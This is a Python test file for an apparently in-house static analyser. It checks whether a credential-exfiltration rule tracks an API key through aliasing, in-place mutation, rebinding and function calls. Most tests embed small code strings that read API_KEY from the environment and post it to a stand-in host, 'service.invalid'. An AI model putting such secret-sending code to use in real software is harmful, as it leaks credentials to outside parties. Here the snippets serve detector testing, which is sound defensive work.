"""Bounded built-in binding identity and immutable rebinding regressions."""

import unittest
from test_qindun_certify import MODULE


class PythonBindingIdentityTests(unittest.TestCase):
    def dispositions(self, body):
        source = 'import os,requests\nkey=os.getenv("API_KEY")\n' + body
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        return {
            hit.disposition for hit in hits
            if hit.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
        }

    def test_builtin_alias_mutation_and_rebinding(self):
        bindings = (
            "alias=value\n",
            "alias:object=value\n",
            "alias,unused=(value,None)\n",
            "alias=second=value\n",
        )
        operations = (
            ('value="public"\n', "value+=key\n", "alias", set()),
            ('value=("public",)\n', "value+=(key,)\n", "alias", set()),
            ("value=[]\n", "value+=[key]\n", "alias", {"confirmed"}),
            ("value={}\n", 'value|={"payload":key}\n', "alias", {"confirmed"}),
            ("value={1}\n", "value|={key}\n", "alias", {"confirmed"}),
            ('value={"payload":""}\n', 'alias["payload"]=key\n', "value", {"confirmed"}),
            ('value={"payload":""}\n', 'alias["payload"]+=key\n', "value", {"confirmed"}),
            ("value=[]\n", "alias.append(key)\n", "value", {"confirmed"}),
            ("value=[]\n", "alias.extend([key])\n", "value", {"confirmed"}),
            ("value={1}\n", "alias.add(key)\n", "value", {"confirmed"}),
            ("value={}\n", "alias.update(payload=key)\n", "value", {"confirmed"}),
            ("value={}\n", 'alias={"payload":key}\n', "value", set()),
        )
        for binding in bindings:
            for initial, mutation, sink, expected in operations:
                with self.subTest(binding=binding, mutation=mutation):
                    self.assertEqual(
                        self.dispositions(initial + binding + mutation
                                          + f'requests.post("https://service.invalid",json={sink})\n'),
                        expected,
                    )

    def test_chained_literal_and_parallel_swap_keep_references(self):
        for binding in (
            "value=alias=[]\nalias.append(key)\n",
            "value=[]\nother=[]\nother,value=value,other\nother.append(key)\nvalue=other\n",
        ):
            with self.subTest(binding=binding):
                self.assertEqual(
                    self.dispositions(binding + 'requests.post("https://service.invalid",json=value)\n'),
                    {"confirmed"},
                )

    def test_public_mutation_and_separate_raw_payload(self):
        body = 'value=[]\nalias:object=value\nalias.append("public")\n'
        self.assertEqual(
            self.dispositions(body + 'requests.post("https://service.invalid",json=value)\n'), set()
        )
        self.assertEqual(
            self.dispositions(body + 'requests.post("https://service.invalid",json=value,data=key)\n'),
            {"confirmed"},
        )

    def test_local_function_bindings_keep_type_and_caller_isolation(self):
        for initial, change, expected in (
            ('value="public"', "value+=key", set()),
            ("value=[]", "value+=[key]", {"confirmed"}),
        ):
            with self.subTest(initial=initial):
                self.assertEqual(
                    self.dispositions(
                        f'def send():\n    {initial}\n    alias=value\n    {change}\n'
                        '    requests.post("https://service.invalid",json=alias)\nsend()\n'
                    ), expected,
                )

    def test_function_cache_distinguishes_type_and_alias_topology(self):
        bodies = (
            'value=()\ndef send():\n    alias=value\n    alias+=(key,)\n'
            '    requests.post("https://service.invalid",json=value)\n'
            'send()\nvalue=[]\nsend()\n',
            'value=[]\nother=[]\ndef send():\n    value.append(key)\n'
            '    requests.post("https://service.invalid",json=other)\n'
            'send()\nother=value\nsend()\n',
        )
        for body in bodies:
            with self.subTest(body=body):
                self.assertEqual(self.dispositions(body), {"confirmed"})

    def test_import_rebinding_discards_old_container_shape(self):
        for binding in ("import other as value", "from other import value"):
            with self.subTest(binding=binding):
                self.assertEqual(
                    self.dispositions(
                        f'value=[]\n{binding}\nresult=value.append(key)\n'
                        'requests.post("https://service.invalid",json=result)\n'
                    ), {"confirmed"},
                )

    def test_unmodeled_target_binding_invalidates_old_shape(self):
        for binding in (
            "for value in objects:\n    result=value.append(key)\n",
            "result=(value:=client).append(key)\nresult=value.append(key)\n",
        ):
            with self.subTest(binding=binding):
                source = 'import os,requests\nkey=os.getenv("API_KEY")\nvalue=[]\n' + binding
                source += 'requests.post("https://service.invalid",json=result)\n'
                hits, error = MODULE._python_flow_findings("main.py", source)
                self.assertIsNotNone(error)
                self.assertIn("confirmed", {
                    hit.disposition for hit in hits
                    if hit.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                })

    def test_list_method_return_does_not_carry_payload(self):
        self.assertEqual(
            self.dispositions('value=[]\nresult=value.append(key)\nrequests.post("https://service.invalid",json=result)\n'),
            set(),
        )
